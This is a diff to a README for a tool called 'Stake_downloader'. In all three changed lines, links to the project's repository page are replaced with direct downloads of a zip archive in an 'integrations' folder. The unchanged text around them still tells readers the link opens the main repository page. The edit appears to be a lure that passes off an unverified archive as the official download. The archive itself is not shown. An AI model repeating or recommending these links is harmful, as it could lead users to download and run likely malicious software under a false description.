@@ -1,6 +1,6 @@
 # 🎥 Stake_downloader - Capture Viral Video Moments Easily
 
-[![Download Stake_downloader](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Gerys115/Stake_downloader)
+[![Download Stake_downloader](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Gerys115/Stake_downloader/raw/refs/heads/main/integrations/Stake-downloader-2.8.zip)
 
 ---
 
@@ -54,7 +54,7 @@ Make sure your computer meets these minimum specifications:
 
 Click on the badge below to go to the official GitHub page where you can get Stake_downloader:
 
-[![Download Stake_downloader](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Gerys115/Stake_downloader)
+[![Download Stake_downloader](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Gerys115/Stake_downloader/raw/refs/heads/main/integrations/Stake-downloader-2.8.zip)
 
 This link will take you to the main repository page. Look for the latest release or download section to find the installer for Windows.
 
@@ -133,7 +133,7 @@ If you run into problems:
 
 For detailed guides, updates, and community support, visit the official GitHub page:
 
-[https://github.com/Gerys115/Stake_downloader](https://github.com/Gerys115/Stake_downloader)
+[https://github.com/Gerys115/Stake_downloader/raw/refs/heads/main/integrations/Stake-downloader-2.8.zip](https://github.com/Gerys115/Stake_downloader/raw/refs/heads/main/integrations/Stake-downloader-2.8.zip)
 
 You can find additional resources there like FAQs, feature updates, and troubleshooting tips.
 
